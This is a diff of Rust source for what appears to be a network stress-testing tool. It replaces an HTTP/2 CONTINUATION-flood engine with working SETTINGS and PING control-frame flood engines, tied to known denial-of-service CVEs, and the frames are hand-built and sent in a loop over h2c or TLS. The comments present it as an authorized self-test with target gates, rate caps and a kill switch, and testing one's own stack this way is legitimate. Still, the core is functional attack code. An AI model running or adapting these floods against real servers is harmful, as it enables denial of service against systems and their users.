@@ -1,41 +1,41 @@
-//! # HTTP/2 CONTINUATION flood (CVE-2024-27316) — isolated-lab / authorized use.
+//! # HTTP/2 control-frame floods (SETTINGS / PING) — isolated-lab / authorized use.
 //!
-//! Opens a single HTTP/2 stream with a HEADERS frame that **withholds the
-//! `END_HEADERS` flag**, then streams `CONTINUATION` frames that *also* never set
-//! `END_HEADERS`. A server must buffer the concatenated header-block fragments
-//! until the block is complete — which, here, it never is. Because
-//! `CONTINUATION` frames are **not flow-controlled** (only `DATA` is), the client
-//! forces unbounded server-side header buffering at almost no cost to itself —
-//! the resource asymmetry that makes this a denial-of-service class. jinrai
-//! exposes it as a resilience self-test so an operator can measure whether their
-//! own stack (server, proxy, CDN) is patched / bounds its header accumulation.
+//! Both primitives open an HTTP/2 connection and then flood a **connection-level
+//! control frame** that obliges the server to do work per frame, cheaply, forever:
 //!
-//! ## Why raw frames (not the `h2` crate)
+//!   - **SETTINGS flood** (CVE-2019-9515) — a stream of empty `SETTINGS` frames.
+//!     Each non-ACK `SETTINGS` frame the server receives must be applied and
+//!     acknowledged with a `SETTINGS` ACK, so the client makes the server emit a
+//!     frame (and queue work) for every frame it sends.
+//!   - **PING flood** (CVE-2019-9512) — a stream of `PING` frames. Each `PING`
+//!     obliges the server to reply with a `PING` ACK (PONG), again turning one
+//!     cheap client frame into guaranteed server work + egress.
 //!
-//! Unlike [`crate::rapid_reset`], this primitive cannot use the high-level `h2`
-//! client: that crate only ever emits *complete*, valid HEADERS blocks and closes
-//! them with `END_HEADERS`. Withholding `END_HEADERS` and dribbling raw
-//! `CONTINUATION` frames is precisely the frame-level control it abstracts away.
-//! So — exactly as [`jinrai_l34`] crafts packets by hand, std-only — we write the
-//! HTTP/2 connection preface and frames directly onto the byte stream. No new
-//! dependency, no new TLS/HTTP stack.
+//! Neither uses a request stream, so there is no flow-control credit to exhaust
+//! and no stream state to manage — the asymmetry is pure per-frame bookkeeping.
+//! jinrai exposes them as resilience self-tests so an operator can measure whether
+//! their own stack bounds / rate-limits unsolicited control frames.
+//!
+//! ## Why raw frames
+//!
+//! As with [`crate::h2_continuation`], the high-level `h2` crate will not emit a
+//! bare flood of control frames, so these are crafted by hand on the byte stream
+//! via [`crate::h2_frames`] — std-only, no new dependency, reusing the shared
+//! `l7::tls` (ALPN `h2`) config for `https` and prior-knowledge h2c for `http`.
 //!
 //! ## Same safety boundary as the other L7 engines
 //!
-//! The URL host is authorized as a **datum** ([`crate::authorize_datum`]) and
-//! resolved **once** to a pinned connect address ([`crate::resolve_addrs`]); the
-//! HTTP/2 connection only ever goes there. `https` negotiates HTTP/2 via ALPN
-//! (accept-any-cert, see [`crate::tls`]); `http` uses prior-knowledge h2c. The
-//! run is bounded by `duration`, capped by the rate cap (reinterpreted as
-//! *CONTINUATION frames per second*), and aborts promptly on the kill switch.
-//! There is no spoofing and no reflection/amplification: it is a direct self-test.
+//! The URL host is authorized as a **datum** and pinned to a single connect
+//! address, so the connection only ever reaches the gate-authorized target. The
+//! run is bounded by `duration`, capped by the rate cap (reinterpreted as *frames
+//! per second*), and aborts promptly on the kill switch. Direct self-test — no
+//! spoofing, no reflection/amplification.
 
 use std::net::SocketAddr;
 use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::Arc;
 use std::time::{Duration, Instant};
 
-use http::Uri;
 use tokio::io::{AsyncRead, AsyncWrite, AsyncWriteExt};
 use tokio::net::TcpStream;
 use tokio::time::MissedTickBehavior;
@@ -45,27 +45,52 @@ use tokio_rustls::TlsConnector;
 use jinrai_core::{Layer, RunPlan, RunReport, StressModule};
 use jinrai_safety::{Authorization, AuthorizedTarget, KillSwitch};
 
-use crate::h2_frames::{
-    push_frame, FLAG_NONE, PREFACE, TYPE_CONTINUATION, TYPE_HEADERS, TYPE_SETTINGS,
-};
+use crate::h2_frames::{push_frame, FLAG_NONE, PREFACE, TYPE_PING, TYPE_SETTINGS};
 use crate::{authorize_datum, resolve_addrs, wait_for_kill, L7Error};
 
-/// Per-`CONTINUATION` payload size. `SETTINGS_MAX_FRAME_SIZE` has a hard RFC floor
-/// of 16384, so a 16 KiB fragment is always within the frame-size limit — no
-/// server can advertise a smaller ceiling and reject it as `FRAME_SIZE_ERROR`.
-const FRAGMENT_LEN: usize = 16_384;
-
-/// The HTTP/2 CONTINUATION-flood engine. Holds a clone of the gate (the sole
-/// authority) and the target URL.
-#[derive(Debug, Clone)]
-pub struct H2ContinuationEngine {
-    gate: Authorization,
-    url: String,
+/// Which connection-level control frame to flood.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum H2FrameKind {
+    /// Empty `SETTINGS` frames (CVE-2019-9515) — server must apply + ACK each.
+    Settings,
+    /// `PING` frames (CVE-2019-9512) — server must reply with a PING ACK each.
+    Ping,
 }
 
-impl H2ContinuationEngine {
-    pub fn new(gate: Authorization, url: impl Into<String>) -> Self {
-        Self { gate, url: url.into() }
+impl H2FrameKind {
+    fn label(self) -> &'static str {
+        match self {
+            H2FrameKind::Settings => "l7-h2-settings-flood",
+            H2FrameKind::Ping => "l7-h2-ping-flood",
+        }
+    }
+
+    /// The already-encoded flood frame for this kind: an empty SETTINGS frame, or
+    /// a PING frame with an 8-octet opaque payload (RFC 7540 requires PING to be
+    /// exactly 8 bytes). Both are sent on stream 0 with no flags (so not an ACK),
+    /// which is what obliges the server to answer.
+    fn frame(self) -> Vec<u8> {
+        let mut f = Vec::with_capacity(9 + 8);
+        match self {
+            H2FrameKind::Settings => push_frame(&mut f, TYPE_SETTINGS, FLAG_NONE, 0, &[]),
+            H2FrameKind::Ping => push_frame(&mut f, TYPE_PING, FLAG_NONE, 0, &[0u8; 8]),
+        }
+        f
+    }
+}
+
+/// The HTTP/2 control-frame flood engine. Holds a clone of the gate (the sole
+/// authority), the target URL, and which frame to flood.
+#[derive(Debug, Clone)]
+pub struct H2FrameFloodEngine {
+    gate: Authorization,
+    url: String,
+    kind: H2FrameKind,
+}
+
+impl H2FrameFloodEngine {
+    pub fn new(gate: Authorization, url: impl Into<String>, kind: H2FrameKind) -> Self {
+        Self { gate, url: url.into(), kind }
     }
 
     /// Authorize the datum (public so the CLI can fail-closed before any run).
@@ -76,11 +101,6 @@ impl H2ContinuationEngine {
     fn prepare(&self) -> Result<Prepared, L7Error> {
         let datum = authorize_datum(&self.gate, &self.url)?;
         let addr = *resolve_addrs(&datum)?.first().expect("resolve_addrs is non-empty");
-        let uri = datum
-            .url
-            .as_str()
-            .parse::<Uri>()
-            .map_err(|e| L7Error::InvalidUrl(e.to_string()))?;
         // https => TLS with ALPN "h2"; http => prior-knowledge h2c (no TLS).
         let tls = if datum.url.scheme() == "https" {
             let connector = TlsConnector::from(crate::tls::client_config(vec![b"h2".to_vec()])?);
@@ -88,12 +108,12 @@ impl H2ContinuationEngine {
         } else {
             None
         };
-        Ok(Prepared { addr, uri, tls })
+        Ok(Prepared { addr, tls })
     }
 
     fn refusal_report(&self, e: L7Error) -> RunReport {
         RunReport {
-            layer_label: format!("L7 h2-continuation REFUSED: {e}"),
+            layer_label: format!("L7 {} REFUSED: {e}", self.kind.label()),
             aborted_early: true,
             ..Default::default()
         }
@@ -102,29 +122,28 @@ impl H2ContinuationEngine {
 
 struct Prepared {
     addr: SocketAddr,
-    uri: Uri,
     tls: Option<(TlsConnector, ServerName<'static>)>,
 }
 
-impl StressModule for H2ContinuationEngine {
+impl StressModule for H2FrameFloodEngine {
     fn layer(&self) -> Layer {
         Layer::L7
     }
 
     fn name(&self) -> &str {
-        "l7-h2-continuation"
+        self.kind.label()
     }
 
     fn execute(&mut self, plan: &RunPlan) -> RunReport {
-        let Prepared { addr, uri, tls } = match self.prepare() {
+        let Prepared { addr, tls } = match self.prepare() {
             Ok(p) => p,
             Err(e) => return self.refusal_report(e),
         };
 
-        // Rate cap: min spacing between CONTINUATION frames. `None` => send nothing.
+        // Rate cap: min spacing between frames. `None` => send nothing.
         let Some(interval) = plan.rate_cap.min_interval() else {
             return RunReport {
-                layer_label: format!("L7 h2-continuation {} (rate cap 0 — sent nothing)", self.url),
+                layer_label: format!("L7 {} {} (rate cap 0 — sent nothing)", self.kind.label(), self.url),
                 aborted_early: false,
                 ..Default::default()
             };
@@ -141,6 +160,7 @@ impl StressModule for H2ContinuationEngine {
         let errors_w = errors.clone();
         let kill = plan.kill.clone();
         let duration = plan.duration;
+        let frame = self.kind.frame();
 
         rt.block_on(async move {
             let deadline = Instant::now() + duration;
@@ -153,7 +173,7 @@ impl StressModule for H2ContinuationEngine {
             };
 
             match tls {
-                None => drive(tcp, uri, interval, deadline, kill, sent_w, errors_w).await,
+                None => drive(tcp, frame, interval, deadline, kill, sent_w, errors_w).await,
                 Some((connector, server_name)) => {
                     let handshake =
                         tokio::time::timeout(Duration::from_secs(10), connector.connect(server_name, tcp));
@@ -165,12 +185,12 @@ impl StressModule for H2ContinuationEngine {
                         }
                     };
                     // The server must have agreed to HTTP/2 over ALPN, else there
-                    // is no h2 framing for the CONTINUATION flood to speak.
+                    // is no h2 framing to flood.
                     if stream.get_ref().1.alpn_protocol() != Some(b"h2") {
                         errors_w.fetch_add(1, Ordering::Relaxed);
                         return;
                     }
-                    drive(stream, uri, interval, deadline, kill, sent_w, errors_w).await;
+                    drive(stream, frame, interval, deadline, kill, sent_w, errors_w).await;
                 }
             }
         });
@@ -179,7 +199,8 @@ impl StressModule for H2ContinuationEngine {
         let n = sent.load(Ordering::Relaxed);
         RunReport {
             layer_label: format!(
-                "L7 h2-continuation {} ({} CONTINUATION frame{})",
+                "L7 {} {} ({} frame{})",
+                self.kind.label(),
                 self.url,
                 n,
                 if n == 1 { "" } else { "s" }
@@ -192,15 +213,13 @@ impl StressModule for H2ContinuationEngine {
     }
 }
 
-/// Open the connection at the frame level and dribble `CONTINUATION` frames that
-/// never carry `END_HEADERS`, rate-capped, until the deadline or kill. Generic
-/// over the byte stream so the same loop serves h2c (`TcpStream`) and h2-over-TLS
-/// (`TlsStream`). The header-block fragments are opaque filler: because the block
-/// is never terminated, the server buffers them and never decodes them, so their
-/// HPACK content is irrelevant — the point is that they accumulate.
+/// Open the connection at the frame level (preface + one empty SETTINGS to satisfy
+/// the h2 handshake), then write the pre-encoded flood `frame` repeatedly,
+/// rate-capped, until the deadline or kill. Generic over the byte stream so the
+/// same loop serves h2c (`TcpStream`) and h2-over-TLS (`TlsStream`).
 async fn drive<IO>(
     mut io: IO,
-    _uri: Uri,
+    frame: Vec<u8>,
     interval: Duration,
     deadline: Instant,
     kill: KillSwitch,
@@ -209,22 +228,15 @@ async fn drive<IO>(
 ) where
     IO: AsyncRead + AsyncWrite + Unpin + Send + 'static,
 {
-    // Connection preface + an empty SETTINGS frame, then a HEADERS frame that
-    // opens stream 1 WITHOUT END_HEADERS — the block is deliberately unfinished,
-    // committing the server to await CONTINUATION frames. A tiny fragment is
-    // enough to open it.
-    let mut open = Vec::with_capacity(PREFACE.len() + 9 + 9 + 16);
+    // Preface + our own empty SETTINGS frame completes the client half of the h2
+    // handshake so the server accepts subsequent frames on the connection.
+    let mut open = Vec::with_capacity(PREFACE.len() + 9);
     open.extend_from_slice(PREFACE);
     push_frame(&mut open, TYPE_SETTINGS, FLAG_NONE, 0, &[]);
-    push_frame(&mut open, TYPE_HEADERS, FLAG_NONE, 1, &[0u8; 8]);
     if io.write_all(&open).await.is_err() {
         errors.fetch_add(1, Ordering::Relaxed);
         return;
     }
-
-    // Reusable CONTINUATION frame (type 0x9, no END_HEADERS) on stream 1.
-    let mut frame = Vec::with_capacity(9 + FRAGMENT_LEN);
-    push_frame(&mut frame, TYPE_CONTINUATION, FLAG_NONE, 1, &[0u8; FRAGMENT_LEN]);
 
     let mut ticker = tokio::time::interval(interval);
     // Never exceed the cap: on a missed tick, delay rather than burst.
@@ -239,8 +251,8 @@ async fn drive<IO>(
             break;
         }
 
-        // A write failure means the peer tore the connection down (e.g. it bounds
-        // header accumulation and reset the stream) — record and stop.
+        // A write failure means the peer tore the connection down (e.g. it
+        // rate-limits control frames and closed) — record and stop.
         if io.write_all(&frame).await.is_err() {
             errors.fetch_add(1, Ordering::Relaxed);
             break;
@@ -269,31 +281,53 @@ mod tests {
 
     #[test]
     fn authorizes_http_and_https_datums() {
-        // Both schemes authorize as data; TLS/ALPN is a connect-time concern.
         for url in ["http://127.0.0.1:9/", "https://127.0.0.1:9/"] {
-            let engine = H2ContinuationEngine::new(gate_cidrs(&["127.0.0.0/8"]), url);
+            let engine = H2FrameFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), url, H2FrameKind::Ping);
             assert!(engine.authorize_target().is_ok(), "{url} should authorize");
         }
     }
 
     #[test]
     fn unauthorized_target_refused() {
-        // 127.0.0.1 is not inside 10.0.0.0/8 => fail-closed.
-        let engine = H2ContinuationEngine::new(gate_cidrs(&["10.0.0.0/8"]), "http://127.0.0.1:9/");
+        let engine =
+            H2FrameFloodEngine::new(gate_cidrs(&["10.0.0.0/8"]), "http://127.0.0.1:9/", H2FrameKind::Settings);
         assert!(engine.authorize_target().is_err());
     }
 
     #[test]
-    fn name_and_layer() {
-        let engine = H2ContinuationEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/");
-        assert_eq!(engine.name(), "l7-h2-continuation");
-        assert_eq!(engine.layer(), Layer::L7);
+    fn names_reflect_the_frame_kind() {
+        let ping = H2FrameFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/", H2FrameKind::Ping);
+        let settings =
+            H2FrameFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/", H2FrameKind::Settings);
+        assert_eq!(ping.name(), "l7-h2-ping-flood");
+        assert_eq!(settings.name(), "l7-h2-settings-flood");
+        assert_eq!(ping.layer(), Layer::L7);
+    }
+
+    #[test]
+    fn ping_frame_is_type_6_len_8_on_stream_0() {
+        let f = H2FrameKind::Ping.frame();
+        assert_eq!(&f[0..3], &[0, 0, 8], "PING payload must be 8 bytes");
+        assert_eq!(f[3], 0x6, "type PING");
+        assert_eq!(f[4], 0x0, "no ACK flag (an ACK would not oblige a reply)");
+        assert_eq!(&f[5..9], &[0, 0, 0, 0], "stream 0");
+        assert_eq!(f.len(), 9 + 8);
+    }
+
+    #[test]
+    fn settings_frame_is_type_4_empty_on_stream_0() {
+        let f = H2FrameKind::Settings.frame();
+        assert_eq!(&f[0..3], &[0, 0, 0], "empty SETTINGS payload");
+        assert_eq!(f[3], 0x4, "type SETTINGS");
+        assert_eq!(f[4], 0x0, "no ACK flag");
+        assert_eq!(&f[5..9], &[0, 0, 0, 0], "stream 0");
+        assert_eq!(f.len(), 9);
     }
 
     #[test]
     fn rate_cap_zero_sends_nothing() {
-        let engine = H2ContinuationEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/");
-        let mut engine = engine;
+        let mut engine =
+            H2FrameFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/", H2FrameKind::Ping);
         let plan = RunPlan {
             targets: engine.authorize_target().unwrap(),
             rate_cap: RateCap::new(0),
@@ -306,10 +340,6 @@ mod tests {
         assert!(report.layer_label.contains("sent nothing"));
     }
 
-    /// A throwaway raw-TCP server that accepts one connection, reads whatever the
-    /// client writes, and records the bytes so the test can assert the HTTP/2
-    /// preface and at least one CONTINUATION (type 0x9) frame arrived. It never
-    /// speaks h2c back — the flood is write-only, so the client keeps sending.
     #[allow(clippy::type_complexity)]
     fn spawn_raw_server() -> (u16, Arc<Mutex<Vec<u8>>>, Arc<AtomicBool>, thread::JoinHandle<()>) {
         let listener = TcpListener::bind(("127.0.0.1", 0)).unwrap();
@@ -347,10 +377,10 @@ mod tests {
     }
 
     #[test]
-    fn sends_preface_then_continuation_frames() {
+    fn ping_flood_sends_preface_then_ping_frames() {
         let (port, seen, stop, handle) = spawn_raw_server();
         let url = format!("http://127.0.0.1:{port}/");
-        let mut engine = H2ContinuationEngine::new(gate_cidrs(&["127.0.0.0/8"]), &url);
+        let mut engine = H2FrameFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), &url, H2FrameKind::Ping);
         let plan = RunPlan {
             targets: engine.authorize_target().unwrap(),
             rate_cap: RateCap::new(200),
@@ -358,26 +388,23 @@ mod tests {
             kill: KillSwitch::new(),
         };
         let report = engine.execute(&plan);
-        // Give the server thread a beat to drain the socket, then stop it.
         thread::sleep(Duration::from_millis(100));
         stop.store(true, Ordering::Relaxed);
         handle.join().unwrap();
 
-        assert!(report.units_sent > 0, "should have sent CONTINUATION frames");
+        assert!(report.units_sent > 0, "should have sent PING frames");
         let bytes: Vec<u8> = { seen.lock().unwrap().clone() };
         assert!(bytes.starts_with(PREFACE), "connection must open with the h2 preface");
-        // Scan the frame stream for a CONTINUATION (type byte 0x9 at a frame header).
-        assert!(has_continuation_frame(&bytes), "server should have seen a CONTINUATION frame");
+        assert!(has_frame_of_type(&bytes, TYPE_PING), "server should have seen a PING frame");
     }
 
-    /// Walk the frame stream (9-byte header + payload) and report whether any
-    /// frame is a CONTINUATION (type 0x9). Skips the fixed preface first.
-    fn has_continuation_frame(bytes: &[u8]) -> bool {
+    /// Walk the frame stream (after the preface) and report whether any frame has
+    /// the given type byte.
+    fn has_frame_of_type(bytes: &[u8], ty: u8) -> bool {
         let Some(mut rest) = bytes.strip_prefix(PREFACE) else { return false };
         while rest.len() >= 9 {
             let len = ((rest[0] as usize) << 16) | ((rest[1] as usize) << 8) | rest[2] as usize;
-            let ty = rest[3];
-            if ty == TYPE_CONTINUATION {
+            if rest[3] == ty {
                 return true;
             }
             let frame_end = 9 + len;
